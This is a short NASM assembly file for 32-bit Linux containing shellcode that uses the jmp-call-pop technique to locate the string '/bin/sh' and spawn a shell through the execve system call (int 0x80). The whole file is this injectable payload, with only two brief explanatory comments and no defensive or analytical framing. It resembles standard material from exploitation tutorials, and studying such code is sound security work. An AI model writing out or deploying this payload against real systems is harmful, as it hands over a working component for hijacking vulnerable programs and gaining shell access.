BITS 32

  jmp short hip
hop:
  pop ebx	;ebx will have '/bin/sh/' in it after jmp
  xor eax, eax
  mov [ebx+7], al
  mov [ebx+8], ebx
  mov [ebx+12], eax
  lea ecx, [ebx+8]
  lea edx, [ebx+12]
  mov al, 0x0b
  int 0x80

hip:
  call hop	;jmp needed to get /bin/sh on the stack
  db '/bin/sh'
